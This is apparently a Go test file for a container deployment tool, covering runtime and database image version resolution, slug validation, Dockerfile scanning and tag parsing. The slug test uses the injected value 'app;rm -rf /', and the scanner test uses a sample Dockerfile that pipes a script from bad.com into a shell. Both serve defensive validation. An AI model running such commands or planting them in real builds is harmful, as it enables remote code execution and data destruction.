package http

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func TestRuntimeVersionResolver(t *testing.T) {
	// Test user-specified versions
	nodeUser := resolveRuntimeVersion("node", "", "18")
	if nodeUser.Version != "18" || nodeUser.FullImage != "node:18-alpine" || nodeUser.Source != "user" {
		t.Errorf("expected node 18 user version, got %+v", nodeUser)
	}

	pyUser := resolveRuntimeVersion("python", "", "3.11")
	if pyUser.Version != "3.11" || pyUser.FullImage != "python:3.11-slim" || pyUser.Source != "user" {
		t.Errorf("expected python 3.11 user version, got %+v", pyUser)
	}

	// Test default fallbacks (auto-resolved from registry or baseline)
	nodeDefault := resolveRuntimeVersion("node", "", "")
	if nodeDefault.Version == "" || !strings.Contains(nodeDefault.FullImage, "node:") || nodeDefault.BaseImage != "node" {
		t.Errorf("expected valid node dynamic version, got %+v", nodeDefault)
	}

	goDefault := resolveRuntimeVersion("go", "", "")
	if goDefault.Version == "" || !strings.Contains(goDefault.FullImage, "golang:") || goDefault.BaseImage != "golang" {
		t.Errorf("expected valid go dynamic version, got %+v", goDefault)
	}

	// Test auto-detection from mock project directory
	tmpDir := t.TempDir()
	_ = os.WriteFile(filepath.Join(tmpDir, ".node-version"), []byte("22.1.0\n"), 0644)

	nodeAuto := resolveRuntimeVersion("node", tmpDir, "")
	if nodeAuto.Version != "22" || nodeAuto.FullImage != "node:22-alpine" || nodeAuto.Source != "project-file" {
		t.Errorf("expected node 22 auto-detected from .node-version, got %+v", nodeAuto)
	}

	// Test Python auto-detection
	pyDir := t.TempDir()
	_ = os.WriteFile(filepath.Join(pyDir, "runtime.txt"), []byte("python-3.10.12\n"), 0644)

	pyAuto := resolveRuntimeVersion("python", pyDir, "")
	if pyAuto.Version != "3.10" || pyAuto.FullImage != "python:3.10-slim" || pyAuto.Source != "project-file" {
		t.Errorf("expected python 3.10 auto-detected from runtime.txt, got %+v", pyAuto)
	}

	// Test Go auto-detection
	goDir := t.TempDir()
	_ = os.WriteFile(filepath.Join(goDir, "go.mod"), []byte("module myapp\n\ngo 1.22.4\n"), 0644)

	goAuto := resolveRuntimeVersion("go", goDir, "")
	if goAuto.Version != "1.22" || goAuto.FullImage != "golang:1.22-alpine" || goAuto.Source != "project-file" {
		t.Errorf("expected go 1.22 auto-detected from go.mod, got %+v", goAuto)
	}
}

func TestDatabaseVersionResolver(t *testing.T) {
	tests := []struct {
		engine      string
		version     string
		expectedTag string
		expectedVer string
	}{
		{"postgres", "15", "postgres:15-alpine", "15"},
		{"mysql", "8.0", "mysql:8.0", "8.0"},
		{"redis", "7.2", "redis:7.2-alpine", "7.2"},
		{"mongodb", "6.0", "mongo:6.0", "6.0"},
	}

	for _, tt := range tests {
		tag, ver := resolveDatabaseVersion(tt.engine, tt.version)
		if tag != tt.expectedTag || ver != tt.expectedVer {
			t.Errorf("resolveDatabaseVersion(%q, %q) = (%q, %q), want (%q, %q)",
				tt.engine, tt.version, tag, ver, tt.expectedTag, tt.expectedVer)
		}
	}

	// Test dynamic database resolution without explicit version
	pgTag, pgVer := resolveDatabaseVersion("postgres", "")
	if pgTag == "" || pgVer == "" || !strings.HasPrefix(pgTag, "postgres:") {
		t.Errorf("expected valid dynamic postgres version, got (%s, %s)", pgTag, pgVer)
	}
}

func TestSlugValidator(t *testing.T) {
	valid := []string{"my-app", "api", "web-backend-1", "service123", "a"}
	for _, s := range valid {
		if err := ValidateSlug(s); err != nil {
			t.Errorf("expected valid slug %q, got error: %v", s, err)
		}
	}

	invalid := []string{"", "My-App", "app_name", "app;rm -rf /", "--bad", "docker", "root", "localhost"}
	for _, s := range invalid {
		if err := ValidateSlug(s); err == nil {
			t.Errorf("expected invalid slug for %q, got nil error", s)
		}
	}
}

func TestDockerfileSecurityScanner(t *testing.T) {
	dangerous := `FROM ubuntu:latest
RUN curl -sSL https://bad.com/install.sh | sh
CMD ["--privileged"]`

	warnings, errors := ScanDockerfileForDangers(dangerous)
	if len(warnings) == 0 && len(errors) == 0 {
		t.Errorf("expected security scanner to detect dangerous patterns in dockerfile")
	}

	safe := `FROM node:20-alpine
WORKDIR /app
COPY . .
RUN npm ci
USER 1001
CMD ["npm", "start"]`

	safeWarns, safeErrs := ScanDockerfileForDangers(safe)
	if len(safeWarns) != 0 || len(safeErrs) != 0 {
		t.Errorf("expected clean dockerfile to have 0 warnings/errors, got %v / %v", safeWarns, safeErrs)
	}
}

func TestDynamicTagParser(t *testing.T) {
	// Test compareVersionStrings
	if compareVersionStrings("23", "22") <= 0 {
		t.Errorf("expected 23 > 22")
	}
	if compareVersionStrings("1.24", "1.23.2") <= 0 {
		t.Errorf("expected 1.24 > 1.23.2")
	}
	if compareVersionStrings("3.12", "3.12") != 0 {
		t.Errorf("expected 3.12 == 3.12")
	}
	if compareVersionStrings("8.4", "8.0") <= 0 {
		t.Errorf("expected 8.4 > 8.0")
	}

	// Test parseBestVersionFromTags
	mockNodeTags := []registryTagItem{
		{Name: "20-alpine"},
		{Name: "22-alpine"},
		{Name: "23-alpine"},
		{Name: "24-rc1-alpine"},
		{Name: "alpine3.21"},
		{Name: "latest"},
	}
	bestNode := parseBestVersionFromTags("node", mockNodeTags, "-alpine", "22")
	if bestNode != "23" {
		t.Errorf("expected best node version 23, got %s", bestNode)
	}

	mockPythonTags := []registryTagItem{
		{Name: "3.11-slim"},
		{Name: "3.12-slim"},
		{Name: "3.13-slim"},
		{Name: "3.14-rc-slim"},
	}
	bestPy := parseBestVersionFromTags("python", mockPythonTags, "-slim", "3.12")
	if bestPy != "3.13" {
		t.Errorf("expected best python version 3.13, got %s", bestPy)
	}
}
